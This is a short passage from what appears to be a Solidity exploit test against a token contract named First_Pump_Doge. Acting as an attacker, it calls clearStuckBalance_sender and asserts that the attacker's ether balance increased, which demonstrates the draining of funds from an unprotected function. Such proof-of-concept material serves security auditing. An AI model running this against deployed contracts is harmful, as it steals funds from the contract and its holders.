        // Now we can call clearStuckBalance_sender as attacker
        First_Pump_Doge(TARGET).clearStuckBalance_sender(100);

        // Verify attacker's balance increased
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Attacker balance should have increased");
